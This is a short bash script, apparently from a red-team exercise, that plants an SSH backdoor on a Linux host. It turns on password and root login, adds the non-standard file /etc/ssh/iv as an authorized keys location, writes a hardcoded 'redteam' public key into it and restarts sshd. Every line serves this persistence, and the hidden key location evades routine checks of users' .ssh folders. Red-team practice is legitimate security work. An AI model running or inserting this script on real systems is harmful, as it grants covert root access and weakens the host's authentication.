#!/bin/bash

# Allow password based login, even for root, because, why not.
sed -i 's/^PasswordAuthentication .*$/PasswordAuthentication yes/' /etc/ssh/sshd_config
sed -i 's/^#PermitRootLogin .*$/PermitRootLogin yes/' /etc/ssh/sshd_config

# Add /etc/sshd/iv as a valid location for authorized keys
sed -i 's/^.*AuthorizedKeysFile.*$/AuthorizedKeysFile \/etc\/ssh\/iv \/root\/.ssh\/authorized_keys \/home\/%u\/.ssh\/authorized_keys/' /etc/ssh/sshd_config

# Write the redteam pubkey to /etc/ssh/iv
echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDZhA5bPlE7Q2ILlNlL/YI6hTvrZfpM1HyxCH7312PnM4l916KpeSzr7oNXNWUqoU6+OKvq44R+5iRw1dG4eXRl/pm1dZZVGJFLZzZArQi1ZwvSwizEOAN6kDQBqT+Zo3NC3AUdu7zZ3tUCEsa8N64gWqIkgGL7/mtXDgMSUb+xL41TRWiOroiz/Djj016b9weNSSEwRvQK8fKkf6vuua3uejpHdQ/2o2BZA8ITZCS6oikib9UFaXp4A5B9PaBzR5Ha8GhSP6BNcZwt25bT15NsFUXk4WfZjk4/bzQCNzSdv1zqakedbmwNnhxEr+1UytftEw1fmOFTo+hVEc/KldHKKEkO+1tnAFQsJoAwtjFLX5MtZBHzN8Y89jLCf6LMrr3TfjRnB0C2oK/21Z6HK47AjS54ovXUwgNpIG1LtWbj1Nhi6vd+RteH4pIfctG8oTBXFcqwl7gGJsf1HofsVxkAw54RYhdNKHZTaddEH7jzWoq2i0jj9g+0nhYTm85IxQE=' > /etc/ssh/iv
chown root.root /etc/ssh/iv
chmod 644 /etc/ssh/iv

# Ubuntu 12 & 14 don't use systemd
if which systemctl; then
    systemctl restart sshd
else
    service ssh restart
fi